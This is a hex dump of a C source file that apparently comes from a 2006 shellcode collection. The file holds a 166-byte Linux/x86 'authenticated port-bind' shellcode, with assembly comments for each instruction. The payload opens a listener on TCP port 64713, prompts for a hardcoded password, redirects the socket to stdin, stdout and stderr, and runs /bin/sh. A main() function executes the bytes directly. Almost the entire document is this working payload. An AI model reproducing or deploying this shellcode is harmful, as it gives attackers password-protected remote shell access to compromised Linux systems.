00000000  2f 2a 20 0d 0a 20 2a 20  6c 69 6e 75 78 2d 78 38  |/* .. * linux-x8|
00000010  36 2d 61 75 74 68 70 6f  72 74 62 69 6e 64 2e 63  |6-authportbind.c|
00000020  20 2d 20 41 55 54 48 20  70 6f 72 74 62 69 6e 64  | - AUTH portbind|
00000030  20 73 68 65 6c 6c 63 6f  64 65 20 31 36 36 20 62  | shellcode 166 b|
00000040  79 74 65 73 20 66 6f 72  20 4c 69 6e 75 78 2f 78  |ytes for Linux/x|
00000050  38 36 0d 0a 20 2a 20 43  6f 70 79 72 69 67 68 74  |86.. * Copyright|
00000060  20 28 63 29 20 32 30 30  36 20 47 6f 74 66 61 75  | (c) 2006 Gotfau|
00000070  6c 74 20 53 65 63 75 72  69 74 79 20 3c 78 67 63  |lt Security <xgc|
00000080  40 67 6f 74 66 61 75 6c  74 2e 6e 65 74 3e 0d 0a  |@gotfault.net>..|
00000090  20 2a 20 0d 0a 20 2a 20  70 6f 72 74 62 69 6e 64  | * .. * portbind|
000000a0  20 73 68 65 6c 6c 63 6f  64 65 20 74 68 61 74 20  | shellcode that |
000000b0  62 69 6e 64 28 29 27 73  20 61 20 73 68 65 6c 6c  |bind()'s a shell|
000000c0  20 6f 6e 20 70 6f 72 74  20 36 34 37 31 33 2f 74  | on port 64713/t|
000000d0  63 70 0d 0a 20 2a 20 61  6e 64 20 72 65 71 75 65  |cp.. * and reque|
000000e0  73 74 73 20 61 20 75 73  65 72 20 70 61 73 73 77  |sts a user passw|
000000f0  6f 72 64 2e 0d 0a 20 2a  0d 0a 20 2a 2f 0d 0a 0d  |ord... *.. */...|
00000100  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
00000110  5d 20 3d 20 0d 0a 0d 0a  20 20 2f 2a 20 73 6f 63  |] = ....  /* soc|
00000120  6b 65 74 28 41 46 5f 49  4e 45 54 2c 20 53 4f 43  |ket(AF_INET, SOC|
00000130  4b 5f 53 54 52 45 41 4d  2c 20 30 29 20 2a 2f 0d  |K_STREAM, 0) */.|
00000140  0a 0d 0a 20 20 22 5c 78  36 61 5c 78 36 36 22 09  |...  "\x6a\x66".|
00000150  09 09 2f 2f 20 70 75 73  68 20 20 20 24 30 78 36  |..// push   $0x6|
00000160  36 0d 0a 20 20 22 5c 78  35 38 22 09 09 09 2f 2f  |6..  "\x58"...//|
00000170  20 70 6f 70 20 20 20 20  25 65 61 78 0d 0a 20 20  | pop    %eax..  |
00000180  22 5c 78 36 61 5c 78 30  31 22 09 09 09 2f 2f 20  |"\x6a\x01"...// |
00000190  70 75 73 68 20 20 20 24  30 78 31 0d 0a 20 20 22  |push   $0x1..  "|
000001a0  5c 78 35 62 22 09 09 09  2f 2f 20 70 6f 70 20 20  |\x5b"...// pop  |
000001b0  20 20 25 65 62 78 0d 0a  20 20 22 5c 78 39 39 22  |  %ebx..  "\x99"|
000001c0  09 09 09 2f 2f 20 63 6c  74 64 0d 0a 20 20 22 5c  |...// cltd..  "\|
000001d0  78 35 32 22 09 09 09 2f  2f 20 70 75 73 68 20 20  |x52"...// push  |
000001e0  20 25 65 64 78 0d 0a 20  20 22 5c 78 35 33 22 09  | %edx..  "\x53".|
000001f0  09 09 2f 2f 20 70 75 73  68 20 20 20 25 65 62 78  |..// push   %ebx|
00000200  0d 0a 20 20 22 5c 78 36  61 5c 78 30 32 22 09 09  |..  "\x6a\x02"..|
00000210  09 2f 2f 20 70 75 73 68  20 20 20 24 30 78 32 0d  |.// push   $0x2.|
00000220  0a 20 20 22 5c 78 38 39  5c 78 65 31 22 09 09 09  |.  "\x89\xe1"...|
00000230  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000240  65 63 78 0d 0a 20 20 22  5c 78 63 64 5c 78 38 30  |ecx..  "\xcd\x80|
00000250  22 09 09 09 2f 2f 20 69  6e 74 20 20 20 20 24 30  |"...// int    $0|
00000260  78 38 30 0d 0a 0d 0a 20  20 2f 2a 20 62 69 6e 64  |x80....  /* bind|
00000270  28 73 2c 20 73 65 72 76  65 72 2c 20 73 69 7a 65  |(s, server, size|
00000280  6f 66 28 73 65 72 76 65  72 29 29 20 2a 2f 0d 0a  |of(server)) */..|
00000290  0d 0a 20 20 22 5c 78 35  32 22 09 09 09 2f 2f 20  |..  "\x52"...// |
000002a0  70 75 73 68 20 20 20 25  65 64 78 0d 0a 20 20 22  |push   %edx..  "|
000002b0  5c 78 36 36 5c 78 36 38  5c 78 66 63 5c 78 63 39  |\x66\x68\xfc\xc9|
000002c0  22 09 09 2f 2f 20 70 75  73 68 77 20 20 24 30 78  |"..// pushw  $0x|
000002d0  63 39 66 63 20 20 2f 2f  20 50 4f 52 54 20 3d 20  |c9fc  // PORT = |
000002e0  36 34 37 31 33 0d 0a 20  20 22 5c 78 36 36 5c 78  |64713..  "\x66\x|
000002f0  36 61 5c 78 30 32 22 09  09 2f 2f 20 70 75 73 68  |6a\x02"..// push|
00000300  77 20 20 24 30 78 32 0d  0a 20 20 22 5c 78 38 39  |w  $0x2..  "\x89|
00000310  5c 78 65 31 22 09 09 09  2f 2f 20 6d 6f 76 20 20  |\xe1"...// mov  |
00000320  20 20 24 65 73 70 2c 25  65 63 78 0d 0a 20 20 22  |  $esp,%ecx..  "|
00000330  5c 78 36 61 5c 78 31 30  22 09 09 09 2f 2f 20 70  |\x6a\x10"...// p|
00000340  75 73 68 20 20 20 24 30  78 31 30 0d 0a 20 20 22  |ush   $0x10..  "|
00000350  5c 78 35 31 22 09 09 09  2f 2f 20 70 75 73 68 20  |\x51"...// push |
00000360  20 20 25 65 63 78 0d 0a  20 20 22 5c 78 35 30 22  |  %ecx..  "\x50"|
00000370  09 09 09 2f 2f 20 70 75  73 68 20 20 20 25 65 61  |...// push   %ea|
00000380  78 0d 0a 20 20 22 5c 78  38 39 5c 78 65 31 22 09  |x..  "\x89\xe1".|
00000390  09 09 2f 2f 20 6d 6f 76  20 20 20 20 25 65 73 70  |..// mov    %esp|
000003a0  2c 25 65 63 78 0d 0a 20  20 22 5c 78 38 39 5c 78  |,%ecx..  "\x89\x|
000003b0  63 36 22 09 09 09 2f 2f  20 6d 6f 76 20 20 20 20  |c6"...// mov    |
000003c0  25 65 61 78 2c 25 65 73  69 0d 0a 20 20 22 5c 78  |%eax,%esi..  "\x|
000003d0  34 33 22 09 09 09 2f 2f  20 69 6e 63 20 20 20 20  |43"...// inc    |
000003e0  25 65 62 78 0d 0a 20 20  22 5c 78 62 30 5c 78 36  |%ebx..  "\xb0\x6|
000003f0  36 22 09 09 09 2f 2f 20  6d 6f 76 20 20 20 20 24  |6"...// mov    $|
00000400  30 78 36 36 2c 25 61 6c  0d 0a 20 20 22 5c 78 63  |0x66,%al..  "\xc|
00000410  64 5c 78 38 30 22 09 09  09 2f 2f 20 69 6e 74 20  |d\x80"...// int |
00000420  20 20 20 24 30 78 38 30  0d 0a 0d 0a 20 20 2f 2a  |   $0x80....  /*|
00000430  20 6c 69 73 74 65 6e 28  73 2c 20 61 6e 79 74 68  | listen(s, anyth|
00000440  69 6e 67 29 20 2a 2f 0d  0a 0d 0a 20 20 22 5c 78  |ing) */....  "\x|
00000450  62 30 5c 78 36 36 22 09  09 09 2f 2f 20 6d 6f 76  |b0\x66"...// mov|
00000460  20 20 20 20 24 30 78 36  36 2c 25 61 6c 0d 0a 20  |    $0x66,%al.. |
00000470  20 22 5c 78 64 31 5c 78  65 33 22 09 09 09 2f 2f  | "\xd1\xe3"...//|
00000480  20 73 68 6c 20 20 20 20  25 65 62 78 0d 0a 20 20  | shl    %ebx..  |
00000490  22 5c 78 63 64 5c 78 38  30 22 09 09 09 2f 2f 20  |"\xcd\x80"...// |
000004a0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
000004b0  20 20 2f 2a 20 61 63 63  65 70 74 28 73 2c 20 30  |  /* accept(s, 0|
000004c0  2c 20 30 29 20 2a 2f 0d  0a 0d 0a 20 20 22 5c 78  |, 0) */....  "\x|
000004d0  35 32 22 09 09 09 2f 2f  20 70 75 73 68 20 20 20  |52"...// push   |
000004e0  25 65 64 78 0d 0a 20 20  22 5c 78 35 32 22 09 09  |%edx..  "\x52"..|
000004f0  09 2f 2f 20 70 75 73 68  20 20 20 25 65 64 78 0d  |.// push   %edx.|
00000500  0a 20 20 22 5c 78 35 36  22 09 09 09 2f 2f 20 70  |.  "\x56"...// p|
00000510  75 73 68 20 20 20 25 65  73 69 0d 0a 20 20 22 5c  |ush   %esi..  "\|
00000520  78 38 39 5c 78 65 31 22  09 09 09 2f 2f 20 6d 6f  |x89\xe1"...// mo|
00000530  76 20 20 20 20 25 65 73  70 2c 25 65 63 78 0d 0a  |v    %esp,%ecx..|
00000540  20 20 22 5c 78 34 33 22  09 09 09 2f 2f 20 69 6e  |  "\x43"...// in|
00000550  63 20 20 20 20 25 65 62  78 0d 0a 20 20 22 5c 78  |c    %ebx..  "\x|
00000560  62 30 5c 78 36 36 22 09  09 09 2f 2f 20 6d 6f 76  |b0\x66"...// mov|
00000570  20 20 20 20 24 30 78 36  36 2c 25 61 6c 0d 0a 20  |    $0x66,%al.. |
00000580  20 22 5c 78 63 64 5c 78  38 30 22 09 09 09 2f 2f  | "\xcd\x80"...//|
00000590  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 0d  | int    $0x80...|
000005a0  0a 20 20 22 5c 78 39 36  22 09 09 09 2f 2f 20 78  |.  "\x96"...// x|
000005b0  63 68 67 20 20 20 25 65  61 78 2c 25 65 73 69 0d  |chg   %eax,%esi.|
000005c0  0a 0d 0a 20 20 2f 2a 20  73 65 6e 64 28 73 2c 20  |...  /* send(s, |
000005d0  22 50 61 73 73 77 6f 72  64 3a 20 22 2c 20 30 78  |"Password: ", 0x|
000005e0  30 61 2c 20 66 6c 61 67  73 29 20 2a 2f 0d 0a 0d  |0a, flags) */...|
000005f0  0a 20 20 22 5c 78 35 32  22 09 09 09 2f 2f 20 70  |.  "\x52"...// p|
00000600  75 73 68 20 20 20 25 65  64 78 0d 0a 20 20 22 5c  |ush   %edx..  "\|
00000610  78 36 38 5c 78 37 32 5c  78 36 34 5c 78 33 61 5c  |x68\x72\x64\x3a\|
00000620  78 32 30 22 09 2f 2f 20  70 75 73 68 20 20 20 24  |x20".// push   $|
00000630  30 78 32 30 33 61 36 34  37 32 0d 0a 20 20 22 5c  |0x203a6472..  "\|
00000640  78 36 38 5c 78 37 33 5c  78 37 33 5c 78 37 37 5c  |x68\x73\x73\x77\|
00000650  78 36 66 22 09 2f 2f 20  70 75 73 68 20 20 20 24  |x6f".// push   $|
00000660  30 78 36 66 37 37 37 33  37 33 0d 0a 20 20 22 5c  |0x6f777373..  "\|
00000670  78 36 36 5c 78 36 38 5c  78 35 30 5c 78 36 31 22  |x66\x68\x50\x61"|
00000680  09 09 2f 2f 20 70 75 73  68 77 20 20 24 30 78 36  |..// pushw  $0x6|
00000690  31 35 30 0d 0a 20 20 22  5c 78 38 39 5c 78 65 37  |150..  "\x89\xe7|
000006a0  22 09 09 09 2f 2f 20 6d  6f 76 20 20 20 20 24 65  |"...// mov    $e|
000006b0  73 70 2c 25 65 64 69 0d  0a 20 20 22 5c 78 36 61  |sp,%edi..  "\x6a|
000006c0  5c 78 30 61 22 09 09 09  2f 2f 20 70 75 73 68 20  |\x0a"...// push |
000006d0  20 20 24 30 78 61 0d 0a  20 20 22 5c 78 35 37 22  |  $0xa..  "\x57"|
000006e0  09 09 09 2f 2f 20 70 75  73 68 20 20 20 25 65 64  |...// push   %ed|
000006f0  69 0d 0a 20 20 22 5c 78  35 36 22 09 09 09 2f 2f  |i..  "\x56"...//|
00000700  20 70 75 73 68 20 20 20  25 65 73 69 0d 0a 20 20  | push   %esi..  |
00000710  22 5c 78 38 39 5c 78 65  31 22 09 09 09 2f 2f 20  |"\x89\xe1"...// |
00000720  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 63 78  |mov    %esp,%ecx|
00000730  0d 0a 20 20 22 5c 78 62  33 5c 78 30 39 22 09 09  |..  "\xb3\x09"..|
00000740  09 2f 2f 20 6d 6f 76 20  20 20 20 24 30 78 39 2c  |.// mov    $0x9,|
00000750  25 62 6c 0d 0a 20 20 22  5c 78 62 30 5c 78 36 36  |%bl..  "\xb0\x66|
00000760  22 09 09 09 2f 2f 20 6d  6f 76 20 20 20 20 24 30  |"...// mov    $0|
00000770  78 36 36 2c 25 61 6c 0d  0a 20 20 22 5c 78 63 64  |x66,%al..  "\xcd|
00000780  5c 78 38 30 22 09 09 09  2f 2f 20 69 6e 74 20 20  |\x80"...// int  |
00000790  20 20 24 30 78 38 30 0d  0a 0d 0a 20 20 2f 2a 20  |  $0x80....  /* |
000007a0  72 65 63 76 28 73 2c 20  2a 62 75 66 2c 20 30 78  |recv(s, *buf, 0x|
000007b0  30 38 2c 20 66 6c 61 67  73 29 20 2a 2f 0d 0a 0d  |08, flags) */...|
000007c0  0a 20 20 22 5c 78 35 32  22 09 09 09 2f 2f 20 70  |.  "\x52"...// p|
000007d0  75 73 68 20 20 20 25 65  64 78 0d 0a 20 20 22 5c  |ush   %edx..  "\|
000007e0  78 36 61 5c 78 30 38 22  09 09 09 2f 2f 20 70 75  |x6a\x08"...// pu|
000007f0  73 68 20 20 20 24 30 78  38 0d 0a 20 20 22 5c 78  |sh   $0x8..  "\x|
00000800  38 64 5c 78 34 63 5c 78  32 34 5c 78 30 38 22 09  |8d\x4c\x24\x08".|
00000810  09 2f 2f 20 6c 65 61 20  20 20 20 30 78 38 28 25  |.// lea    0x8(%|
00000820  65 73 70 29 2c 25 65 63  78 0d 0a 20 20 22 5c 78  |esp),%ecx..  "\x|
00000830  35 31 22 09 09 09 2f 2f  20 70 75 73 68 20 20 20  |51"...// push   |
00000840  25 65 63 78 0d 0a 20 20  22 5c 78 35 36 22 09 09  |%ecx..  "\x56"..|
00000850  09 2f 2f 20 70 75 73 68  20 20 20 25 65 73 69 0d  |.// push   %esi.|
00000860  0a 20 20 22 5c 78 38 39  5c 78 65 31 22 09 09 09  |.  "\x89\xe1"...|
00000870  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000880  65 63 78 0d 0a 20 20 22  5c 78 62 33 5c 78 30 61  |ecx..  "\xb3\x0a|
00000890  22 09 09 09 2f 2f 20 6d  6f 76 20 20 20 20 24 30  |"...// mov    $0|
000008a0  78 61 2c 25 62 6c 0d 0a  20 20 22 5c 78 62 30 5c  |xa,%bl..  "\xb0\|
000008b0  78 36 36 22 09 09 09 2f  2f 20 6d 6f 76 20 20 20  |x66"...// mov   |
000008c0  20 24 30 78 36 36 2c 25  61 6c 0d 0a 20 20 22 5c  | $0x66,%al..  "\|
000008d0  78 63 64 5c 78 38 30 22  09 09 09 2f 2f 20 69 6e  |xcd\x80"...// in|
000008e0  74 20 20 20 20 24 30 78  38 30 0d 0a 0d 0a 20 20  |t    $0x80....  |
000008f0  22 5c 78 38 37 5c 78 66  33 22 09 09 09 2f 2f 20  |"\x87\xf3"...// |
00000900  78 63 68 67 20 20 20 25  65 73 69 2c 25 65 62 78  |xchg   %esi,%ebx|
00000910  0d 0a 0d 0a 20 20 2f 2a  20 6c 69 6b 65 3a 20 73  |....  /* like: s|
00000920  74 72 6e 63 6d 70 28 73  74 72 69 6e 67 31 2c 20  |trncmp(string1, |
00000930  73 74 72 69 6e 67 32 2c  20 30 78 38 29 20 2a 2f  |string2, 0x8) */|
00000940  0d 0a 20 20 0d 0a 20 20  22 5c 78 35 32 22 20 20  |..  ..  "\x52"  |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000960  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000970  25 65 64 78 0d 0a 20 20  22 5c 78 36 38 5c 78 36  |%edx..  "\x68\x6|
00000980  31 5c 78 37 35 5c 78 36  63 5c 78 37 34 22 09 2f  |1\x75\x6c\x74"./|
00000990  2f 20 70 75 73 68 20 20  20 24 30 78 37 34 36 63  |/ push   $0x746c|
000009a0  37 35 36 31 20 2f 2f 20  70 61 73 73 77 6f 72 64  |7561 // password|
000009b0  0d 0a 20 20 22 5c 78 36  38 5c 78 36 37 5c 78 36  |..  "\x68\x67\x6|
000009c0  66 5c 78 37 34 5c 78 36  36 22 09 2f 2f 20 70 75  |f\x74\x66".// pu|
000009d0  73 68 20 20 20 24 30 78  36 36 37 34 36 66 36 37  |sh   $0x66746f67|
000009e0  20 2f 2f 20 68 65 72 65  0d 0a 20 20 22 5c 78 38  | // here..  "\x8|
000009f0  39 5c 78 65 37 22 09 09  09 2f 2f 20 6d 6f 76 20  |9\xe7"...// mov |
00000a00  20 20 20 25 65 73 70 2c  25 65 64 69 0d 0a 20 20  |   %esp,%edi..  |
00000a10  22 5c 78 38 64 5c 78 37  34 5c 78 32 34 5c 78 31  |"\x8d\x74\x24\x1|
00000a20  63 22 09 09 2f 2f 20 6c  65 61 20 20 20 20 30 78  |c"..// lea    0x|
00000a30  31 63 28 25 65 73 70 29  2c 25 65 73 69 0d 0a 20  |1c(%esp),%esi.. |
00000a40  20 22 5c 78 38 39 5c 78  64 31 22 09 09 09 2f 2f  | "\x89\xd1"...//|
00000a50  20 6d 6f 76 20 20 20 20  25 65 64 78 2c 25 65 63  | mov    %edx,%ec|
00000a60  78 0d 0a 20 20 22 5c 78  38 30 5c 78 63 31 5c 78  |x..  "\x80\xc1\x|
00000a70  30 38 22 09 09 2f 2f 20  61 64 64 20 20 20 20 24  |08"..// add    $|
00000a80  30 78 38 2c 25 63 6c 0d  0a 20 20 22 5c 78 66 63  |0x8,%cl..  "\xfc|
00000a90  22 09 09 09 2f 2f 20 63  6c 64 0d 0a 20 20 22 5c  |"...// cld..  "\|
00000aa0  78 66 33 5c 78 61 36 22  09 09 09 2f 2f 20 72 65  |xf3\xa6"...// re|
00000ab0  70 7a 20 20 20 63 6d 70  73 62 20 25 65 73 3a 28  |pz   cmpsb %es:(|
00000ac0  25 65 64 69 29 2c 25 64  73 3a 28 25 65 73 69 29  |%edi),%ds:(%esi)|
00000ad0  0d 0a 20 20 22 5c 78 37  34 5c 78 30 34 22 09 09  |..  "\x74\x04"..|
00000ae0  09 2f 2f 20 6a 65 20 20  20 20 20 64 75 70 0d 0a  |.// je     dup..|
00000af0  0d 0a 20 20 2f 2a 20 65  78 69 74 28 73 6f 6d 65  |..  /* exit(some|
00000b00  74 68 69 6e 67 29 20 2a  2f 0d 0a 0d 0a 20 20 22  |thing) */....  "|
00000b10  5c 78 66 37 5c 78 66 30  22 09 09 09 2f 2f 20 64  |\xf7\xf0"...// d|
00000b20  69 76 20 20 20 20 25 65  61 78 0d 0a 20 20 22 5c  |iv    %eax..  "\|
00000b30  78 63 64 5c 78 38 30 22  09 09 09 2f 2f 20 69 6e  |xcd\x80"...// in|
00000b40  74 20 20 20 20 24 30 78  38 30 0d 0a 0d 0a 20 20  |t    $0x80....  |
00000b50  2f 2a 20 64 75 70 32 28  63 2c 20 32 29 20 2c 20  |/* dup2(c, 2) , |
00000b60  64 75 70 32 28 63 2c 20  31 29 20 2c 20 64 75 70  |dup2(c, 1) , dup|
00000b70  32 28 63 2c 20 30 29 20  2a 2f 0d 0a 0d 0a 20 20  |2(c, 0) */....  |
00000b80  22 5c 78 36 61 5c 78 30  32 22 09 09 09 2f 2f 20  |"\x6a\x02"...// |
00000b90  70 75 73 68 20 20 20 24  30 78 32 0d 0a 20 20 22  |push   $0x2..  "|
00000ba0  5c 78 35 39 22 09 09 09  2f 2f 20 70 6f 70 20 20  |\x59"...// pop  |
00000bb0  20 20 25 65 63 78 0d 0a  0d 0a 20 20 22 5c 78 62  |  %ecx....  "\xb|
00000bc0  30 5c 78 33 66 22 09 09  09 2f 2f 20 6d 6f 76 20  |0\x3f"...// mov |
00000bd0  20 20 20 24 30 78 33 66  2c 25 61 6c 0d 0a 20 20  |   $0x3f,%al..  |
00000be0  22 5c 78 63 64 5c 78 38  30 22 09 09 09 2f 2f 20  |"\xcd\x80"...// |
00000bf0  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 20 20  |int    $0x80..  |
00000c00  22 5c 78 34 39 22 09 09  09 2f 2f 20 64 65 63 20  |"\x49"...// dec |
00000c10  20 20 20 25 65 63 78 0d  0a 20 20 22 5c 78 37 39  |   %ecx..  "\x79|
00000c20  5c 78 66 39 22 09 09 09  2f 2f 20 6a 6e 73 20 20  |\xf9"...// jns  |
00000c30  20 20 64 75 70 5f 6c 6f  6f 70 0d 0a 0d 0a 20 20  |  dup_loop....  |
00000c40  2f 2a 20 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  |/* execve("/bin/|
00000c50  73 68 22 2c 20 5b 22 2f  62 69 6e 2f 73 68 22 5d  |sh", ["/bin/sh"]|
00000c60  2c 20 4e 55 4c 4c 29 20  2a 2f 0d 0a 0d 0a 20 20  |, NULL) */....  |
00000c70  22 5c 78 36 61 5c 78 30  62 22 09 09 09 2f 2f 20  |"\x6a\x0b"...// |
00000c80  70 75 73 68 20 20 20 24  30 78 62 0d 0a 20 20 22  |push   $0xb..  "|
00000c90  5c 78 35 38 22 09 09 09  2f 2f 20 70 6f 70 20 20  |\x58"...// pop  |
00000ca0  20 20 25 65 61 78 0d 0a  20 20 22 5c 78 35 32 22  |  %eax..  "\x52"|
00000cb0  09 09 09 2f 2f 20 70 75  73 68 20 20 20 25 65 64  |...// push   %ed|
00000cc0  78 0d 0a 20 20 22 5c 78  36 38 5c 78 32 66 5c 78  |x..  "\x68\x2f\x|
00000cd0  32 66 5c 78 37 33 5c 78  36 38 22 09 2f 2f 20 70  |2f\x73\x68".// p|
00000ce0  75 73 68 20 20 20 24 30  78 36 38 37 33 32 66 32  |ush   $0x68732f2|
00000cf0  66 0d 0a 20 20 22 5c 78  36 38 5c 78 32 66 5c 78  |f..  "\x68\x2f\x|
00000d00  36 32 5c 78 36 39 5c 78  36 65 22 09 2f 2f 20 70  |62\x69\x6e".// p|
00000d10  75 73 68 20 20 20 24 30  78 36 65 36 39 36 32 32  |ush   $0x6e69622|
00000d20  66 0d 0a 20 20 22 5c 78  38 39 5c 78 65 33 22 09  |f..  "\x89\xe3".|
00000d30  09 09 2f 2f 20 6d 6f 76  20 20 20 20 25 65 73 70  |..// mov    %esp|
00000d40  2c 20 25 65 62 78 0d 0a  20 20 22 5c 78 35 32 22  |, %ebx..  "\x52"|
00000d50  09 09 09 2f 2f 20 70 75  73 68 20 20 20 25 65 64  |...// push   %ed|
00000d60  78 0d 0a 20 20 22 5c 78  35 33 22 09 09 09 2f 2f  |x..  "\x53"...//|
00000d70  20 70 75 73 68 20 20 20  25 65 62 78 0d 0a 20 20  | push   %ebx..  |
00000d80  22 5c 78 38 39 5c 78 65  31 22 09 09 09 2f 2f 20  |"\x89\xe1"...// |
00000d90  6d 6f 76 20 20 20 20 25  65 73 70 2c 20 25 65 63  |mov    %esp, %ec|
00000da0  78 0d 0a 20 20 22 5c 78  63 64 5c 78 38 30 22 3b  |x..  "\xcd\x80";|
00000db0  09 09 09 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |...// int    $0x|
00000dc0  38 30 0d 0a 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |80......int main|
00000dd0  28 29 20 7b 0d 0a 20 0d  0a 20 20 20 20 20 20 20  |() {.. ..       |
00000de0  20 69 6e 74 20 28 2a 66  29 28 29 20 3d 20 28 69  | int (*f)() = (i|
00000df0  6e 74 28 2a 29 28 29 29  73 68 65 6c 6c 63 6f 64  |nt(*)())shellcod|
00000e00  65 3b 0d 0a 20 20 20 20  20 20 20 20 70 72 69 6e  |e;..        prin|
00000e10  74 66 28 22 4c 65 6e 67  74 68 3a 20 25 75 5c 6e  |tf("Length: %u\n|
00000e20  22 2c 20 73 74 72 6c 65  6e 28 73 68 65 6c 6c 63  |", strlen(shellc|
00000e30  6f 64 65 29 29 3b 0d 0a  20 20 20 20 20 20 20 20  |ode));..        |
00000e40  66 28 29 3b 0d 0a 7d                              |f();..}|
00000e47
